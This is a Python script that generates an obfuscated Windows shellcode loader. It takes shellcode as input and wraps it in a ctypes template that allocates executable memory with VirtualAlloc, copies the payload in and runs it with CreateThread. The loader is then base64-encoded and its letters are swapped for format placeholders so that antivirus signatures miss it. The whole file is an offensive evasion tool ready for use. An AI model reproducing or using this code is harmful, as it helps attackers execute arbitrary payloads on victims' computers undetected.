import base64
import string
import re
import os
from colorama import init,Fore,Back,Style
init(autoreset=True)

exec("e=b'" + input("[*] ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ [*]  Input shellcode: ") + "'")
exec("st=e.hex()")
try:
    times = int(input("[*] ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ [*]  Number of encryption(35-49)："))
except:
    print('\033[1;31;40m'"plz Input Number!")

wocao="""import ctypes
import string
import sys
shell="{0}"
buf = bytes.fromhex(shell)
shellcode = bytearray(buf)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))""".format(st)

def Remove_str(shuzu):
    shuzu=sorted(list(set(shuzu)))
    return shuzu

def fix_string(bianliang):
    global num
    danci = []
    danci = re.findall("[a-zA-Z]", bianliang)
    changdu = len(Remove_str(danci))
    n = 0
    a=[]
    if times>changdu:
        print('\033[1;31;40m'"[*] ▇▇▇▇▇▇▇▇▇▇▇ [*]  The value is too large，The max value:"+str(changdu)+"!!!")
        print('\033[1;31;40m'"[*] ▇▇▇▇▇▇▇▇▇▇▇ [*]  Retry!")

    else:
        for cishu in range(0,times,1):
            st=Remove_str(danci)[n]
            bianliang=bianliang.replace(st,"{"+str(cishu)+"}")
            a.append(st)
            n=n+1
            if n>times:
                break
    number = len(a)
    num=number
    return bianliang,a,number

encodestr = base64.b64encode(wocao.encode('utf-8'))
jiazaiqi=str(encodestr,'utf-8')
print(fix_string(jiazaiqi)[0])
f=open('hex.txt','w+')
f.write(fix_string(jiazaiqi)[0]+"\n")
f.write(str(fix_string(jiazaiqi)[1])+"\n")
f.write(str(fix_string(jiazaiqi)[2]))
f.close()


